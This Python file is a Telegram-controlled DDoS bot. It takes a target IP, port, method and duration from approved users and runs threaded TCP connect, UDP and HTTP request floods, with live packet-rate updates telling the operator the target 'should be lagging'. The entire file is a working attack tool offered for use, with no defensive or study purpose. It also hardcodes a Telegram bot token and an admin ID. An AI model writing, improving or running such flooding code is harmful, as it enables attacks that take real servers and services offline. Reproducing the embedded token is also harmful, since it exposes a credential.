# ddos_working_100percent.py
import asyncio
import threading
import time
import random
import socket
import struct
import os
import json
import ssl
from datetime import datetime, timedelta
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes
)

# ---------- CONFIG ----------
BOT_TOKEN = "8278228198:AAG7C97c7R50_gsykoqBMwesCuoRZTciCLA"
ADMIN_IDS = [8210011971]

# Attack config - Railway safe (max 50 threads, but fast per thread)
MAX_THREADS = 40
SOCKETS_PER_THREAD = 30   # Each thread opens 30 UDP sockets
DELAY = 0.00001           # 10 microsecond delay

POWER_LEVEL = 10
THREADS_LEVEL = {i: max(5, int(MAX_THREADS * i / 10)) for i in range(1, 11)}

attack_running = False
current_attack = {'packets': 0, 'message_id': None}
attack_lock = threading.Lock()
user_data = {}

# ---------- SIMPLE USER DB ----------
USERS_FILE = "users.json"
def load_users():
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE) as f:
            return json.load(f)
    return {}
def save_users(u):
    with open(USERS_FILE, 'w') as f:
        json.dump(u, f)
def is_approved(uid):
    u = load_users().get(str(uid), {})
    return u.get("approved", False) or uid in ADMIN_IDS
def approve_user(uid, days):
    u = load_users()
    u[str(uid)] = {"approved": True, "expires": (datetime.now() + timedelta(days=days)).isoformat()}
    save_users(u)

# ---------- AGGRESSIVE ATTACK ENGINES ----------
# 1. TCP SYN Flood (most effective against game servers)
def tcp_syn_flood(ip, port, duration):
    global attack_running, current_attack
    end = time.time() + duration
    port = int(port)
    # Pre-create socket for speed
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(0.001)
    while time.time() < end and attack_running:
        try:
            # Connect and immediately close (SYN flood effect)
            sock.connect_ex((ip, port))
            sock.close()
            # Recreate socket for next attempt (to avoid TIME_WAIT)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.001)
            with attack_lock:
                current_attack['packets'] += 1
            time.sleep(0.00005)  # ultra fast
        except:
            time.sleep(0.0001)
    sock.close()

# 2. UDP Flood with random source ports (bypasses simple filters)
def udp_flood_aggressive(ip, port, duration):
    global attack_running, current_attack
    end = time.time() + duration
    port = int(port)
    # Create multiple UDP sockets with different source ports
    socks = []
    for _ in range(SOCKETS_PER_THREAD):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            # Bind to random port to simulate multiple sources
            s.bind(('', random.randint(10000, 60000)))
            socks.append(s)
        except:
            pass
    payload = random._urandom(1024)  # 1KB payload
    while time.time() < end and attack_running:
        for sock in socks:
            try:
                sock.sendto(payload, (ip, port))
                with attack_lock:
                    current_attack['packets'] += 1
            except:
                pass
        time.sleep(DELAY)
    for sock in socks:
        sock.close()

# 3. HTTP Flood with proper headers and SSL
def http_flood_aggressive(url, duration):
    global attack_running, current_attack
    end = time.time() + duration
    session = requests.Session()
    # Rotate user agents
    ua_list = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Firefox/120.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/537.36'
    ]
    while time.time() < end and attack_running:
        try:
            headers = {'User-Agent': random.choice(ua_list)}
            # Send with stream=False to close connection immediately
            resp = session.get(url, headers=headers, timeout=3, stream=False)
            resp.close()
            with attack_lock:
                current_attack['packets'] += 1
            time.sleep(0.0005)
        except:
            time.sleep(0.005)
    session.close()

def launch_attack(ip, port, duration, method, send_cb):
    global attack_running, current_attack

    attack_running = True
    num_threads = THREADS_LEVEL[POWER_LEVEL]
    with attack_lock:
        current_attack = {
            'ip': ip, 'port': port, 'method': method,
            'duration': duration, 'start': time.time(),
            'packets': 0
        }

    # Choose method
    if method == 'tcp':
        target = tcp_syn_flood
        args = (ip, port, duration)
    elif method == 'udp':
        target = udp_flood_aggressive
        args = (ip, port, duration)
    else:  # http
        url = f"http://{ip}:{port}" if port != 443 else f"https://{ip}:{port}"
        target = http_flood_aggressive
        args = (url, duration)

    # Start threads
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=target, args=args, daemon=True)
        t.start()
        threads.append(t)

    # Monitor with live counter
    keyboard = [
        [InlineKeyboardButton("🛑 STOP", callback_data="stop_attack")],
        [InlineKeyboardButton("ℹ️ INFO", callback_data="info_attack"), InlineKeyboardButton("🔄 REFRESH", callback_data="refresh_attack")]
    ]
    markup = InlineKeyboardMarkup(keyboard)

    start_time = time.time()
    last_update = 0
    last_pkt = 0
    
    while attack_running and (time.time() - start_time) < duration:
        time.sleep(0.8)
        if time.time() - last_update >= 1.5:
            last_update = time.time()
            with attack_lock:
                pkt = current_attack['packets']
            elapsed = int(time.time() - start_time)
            remaining = duration - elapsed
            speed = int((pkt - last_pkt) / 1.5) if last_pkt else int(pkt / elapsed) if elapsed else 0
            last_pkt = pkt
            progress = int((elapsed / duration) * 20)
            bar = "█" * progress + "░" * (20 - progress)
            
            text = (
                f"🔥 *ATTACKING* 🔥\n\n"
                f"🎯 `{ip}:{port}`\n"
                f"⚙️ `{method.upper()}`\n"
                f"📦 Packets: `{pkt:,}`\n"
                f"⏱️ Time: `{elapsed}/{duration}s`\n"
                f"📊 `[{bar}]`\n"
                f"💥 Speed: `{speed:,}` pps\n"
                f"🧵 Threads: `{num_threads}`\n"
                f"🔌 Sockets/thread: `{SOCKETS_PER_THREAD if method=='udp' else 1}`\n\n"
                f"*Expect target lag spike!*"
            )
            try:
                send_cb(text, markup, edit=True, msg_id=current_attack.get('message_id'))
            except:
                pass

    attack_running = False
    for t in threads:
        t.join(timeout=0.5)
    with attack_lock:
        pkt = current_attack['packets']
    avg = int(pkt / duration) if duration else 0
    text = f"✅ *ATTACK FINISHED*\n\n📦 Total: `{pkt:,}` packets\n💥 Avg speed: `{avg:,}` pps\n🕐 Duration: {duration}s"
    try:
        send_cb(text, None, edit=True, msg_id=current_attack.get('message_id'))
    except:
        pass

# ---------- TELEGRAM BOT ----------
async def start(update, context):
    uid = update.effective_user.id
    if not is_approved(uid):
        await update.message.reply_text("❌ Contact admin for access")
        return
    user_data[uid] = {'step': 'ip'}
    await update.message.reply_text(
        f"⚡ *100% DDoS Bot* ⚡\n\n"
        f"Send target IP:\nExample: `192.168.1.1`\n\n"
        f"Power: `{POWER_LEVEL}x` → {THREADS_LEVEL[POWER_LEVEL]} threads\n"
        f"Use `/power 1-10`\n"
        f"*Methods*: TCP (SYN), UDP (aggressive), HTTP",
        parse_mode='Markdown'
    )

async def power(update, context):
    global POWER_LEVEL
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ Unauthorized")
        return
    if not context.args:
        await update.message.reply_text(f"Power: `{POWER_LEVEL}x` ({THREADS_LEVEL[POWER_LEVEL]} threads)")
        return
    try:
        lvl = int(context.args[0])
        if 1 <= lvl <= 10:
            POWER_LEVEL = lvl
            await update.message.reply_text(f"✅ Power set to {lvl}x → {THREADS_LEVEL[lvl]} threads")
        else:
            await update.message.reply_text("Use 1-10")
    except:
        await update.message.reply_text("Invalid")

async def stop(update, context):
    global attack_running
    attack_running = False
    await update.message.reply_text("🛑 Attack stopped")

async def myinfo(update, context):
    uid = update.effective_user.id
    status = "✅" if is_approved(uid) else "❌"
    await update.message.reply_text(f"📋 ID: `{uid}`\n{status} Access", parse_mode='Markdown')

async def blocked(update, context):
    await update.message.reply_text("🚫 Blocked ports: 22,25,443,3389,8700,9031,17500,20000,20001")

async def help_cmd(update, context):
    await update.message.reply_text(
        "🤖 *Commands*\n"
        "/start – Setup\n"
        "/power 1-10 – Set threads\n"
        "/stop – Emergency stop\n"
        "/myinfo – Account\n"
        "/blockedports – Blocked list",
        parse_mode='Markdown'
    )

async def handle(update, context):
    uid = update.effective_user.id
    if not is_approved(uid):
        await update.message.reply_text("❌ Not approved")
        return
    data = user_data.get(uid, {})
    step = data.get('step')
    txt = update.message.text.strip()

    if step == 'ip':
        # Accept IP or domain
        data['ip'] = txt
        data['step'] = 'port'
        user_data[uid] = data
        await update.message.reply_text("Send *port* (1-65535):\nAvoid blocked ports", parse_mode='Markdown')
    elif step == 'port':
        try:
            port = int(txt)
            if port < 1 or port > 65535:
                raise ValueError
            data['port'] = port
            data['step'] = 'method'
            user_data[uid] = data
            kb = [
                [InlineKeyboardButton("🔥 TCP SYN", callback_data="method_tcp")],
                [InlineKeyboardButton("💣 UDP (Aggressive)", callback_data="method_udp")],
                [InlineKeyboardButton("🌐 HTTP Flood", callback_data="method_http")],
                [InlineKeyboardButton("❌ Cancel", callback_data="cancel")]
            ]
            await update.message.reply_text("Select attack method:", reply_markup=InlineKeyboardMarkup(kb))
        except:
            await update.message.reply_text("Invalid port")
    elif step == 'duration':
        try:
            dur = int(txt)
            if dur < 5 or dur > 300:
                raise ValueError
            ip = data['ip']
            port = data['port']
            method = data['method']
            del user_data[uid]
            kb = [[InlineKeyboardButton("✅ START", callback_data=f"start_{ip}_{port}_{dur}_{method}")],
                  [InlineKeyboardButton("❌ Cancel", callback_data="cancel")]]
            await update.message.reply_text(
                f"🔥 *Confirm*\n\n🎯 `{ip}:{port}`\n⚙️ `{method.upper()}`\n⏱️ `{dur}s`\n💪 Power `{POWER_LEVEL}x`\n\nStart?",
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup(kb)
            )
        except:
            await update.message.reply_text("Duration 5-300 seconds")
    else:
        await update.message.reply_text("Send /start")

async def button(update, context):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    data = q.data

    if data == "cancel":
        if uid in user_data:
            del user_data[uid]
        await q.edit_message_text("❌ Cancelled")
        return

    if data.startswith("method_"):
        method = data.split("_")[1]
        user_data[uid]['method'] = method
        user_data[uid]['step'] = 'duration'
        await q.edit_message_text(f"✅ Method: `{method.upper()}`\nSend duration (5-300s):", parse_mode='Markdown')
        return

    if data.startswith("start_"):
        _, ip, port, dur, method = data.split("_")
        port = int(port); dur = int(dur)
        if uid in user_data:
            del user_data[uid]
        
        loop = asyncio.get_event_loop()
        def send_cb(text, markup, edit=False, msg_id=None):
            coro = q.message.reply_text(text, parse_mode='Markdown', reply_markup=markup)
            return asyncio.run_coroutine_threadsafe(coro, loop).result()
        
        threading.Thread(target=launch_attack, args=(ip, port, dur, method, send_cb), daemon=True).start()
        await q.edit_message_text("🚀 Attack launching...\nUse /stop to halt")
        return

    # Attack controls
    global attack_running, current_attack
    if data == "stop_attack":
        attack_running = False
        await q.edit_message_text("🛑 Stopped")
    elif data == "info_attack":
        if attack_running:
            with attack_lock:
                pkt = current_attack['packets']
                elapsed = int(time.time() - current_attack['start'])
                rem = current_attack['duration'] - elapsed
                speed = int(pkt/elapsed) if elapsed else 0
                await q.edit_message_text(
                    f"ℹ️ *Live Attack Info*\n\n📦 Packets: `{pkt:,}`\n⏱️ Remaining: `{rem}s`\n💥 Speed: `{speed:,}` pps",
                    parse_mode='Markdown'
                )
        else:
            await q.edit_message_text("ℹ️ No active attack")
    elif data == "refresh_attack":
        if attack_running:
            with attack_lock:
                pkt = current_attack['packets']
                elapsed = int(time.time() - current_attack['start'])
                rem = current_attack['duration'] - elapsed
                prog = int((elapsed / current_attack['duration']) * 20)
                bar = "█" * prog + "░" * (20 - prog)
                speed = int(pkt/elapsed) if elapsed else 0
                text = (
                    f"💥 *ATTACK ACTIVE* 💥\n\n"
                    f"🎯 `{current_attack['ip']}:{current_attack['port']}`\n"
                    f"📦 `{pkt:,}` pkts\n"
                    f"⏱️ `{elapsed}/{current_attack['duration']}s`\n"
                    f"📊 `[{bar}]`\n"
                    f"💥 `{speed:,}` pps\n\n"
                    f"*Target should be lagging!*"
                )
                kb = [
                    [InlineKeyboardButton("🛑 STOP", callback_data="stop_attack")],
                    [InlineKeyboardButton("ℹ️ INFO", callback_data="info_attack"), InlineKeyboardButton("🔄 REFRESH", callback_data="refresh_attack")]
                ]
                await q.edit_message_text(text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(kb))
        else:
            await q.edit_message_text("✅ No attack")

async def error(update, context):
    print(f"Error: {context.error}")

def main():
    print("💥 100% DDoS Bot Starting...")
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("power", power))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("myinfo", myinfo))
    app.add_handler(CommandHandler("blockedports", blocked))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CallbackQueryHandler(button))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle))
    app.add_error_handler(error)
    print("✅ Bot LIVE! Send /start")
    app.run_polling()

if __name__ == "__main__":
    main()
